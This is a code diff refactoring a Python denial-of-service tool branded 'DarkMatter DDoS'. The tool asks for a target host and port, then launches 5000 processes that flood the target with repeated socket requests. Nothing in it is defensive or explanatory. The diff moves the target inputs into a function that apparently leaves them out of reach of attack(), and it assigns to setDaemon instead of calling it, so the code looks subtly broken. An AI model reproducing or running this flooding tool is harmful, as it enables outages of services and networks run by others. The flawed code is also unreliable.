@@ -1,23 +1,11 @@
 import socket
-import os, sys
-import time
+from time import sleep
 import multiprocessing, random
-
-
-print("Welcome To DarkMatter DDoS")
-ip = input("IP/Domain: ")
-port = int(input("Port: "))
-
-url = "http://" + str(ip)
 
 
 def randomip():
   randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
   return randip
-
-
-print("[>>>] Starting the attack [<<<]")
-time.sleep(1)
 
 
 def attack():
@@ -34,12 +22,19 @@ def attack():
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
-      time.sleep(.1)
+      sleep(.1)
     except:
       pass
 
 
 def send2attack():
+  print("Welcome To DarkMatter DDoS\n")
+  ip = input("IP/Domain: ")
+  port = int(input("Port: "))
+  url = f"http://{str(ip)}"
+  print("[>>>] Starting the attack [<<<]")
+  sleep(1)
+
   for i in range(5000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
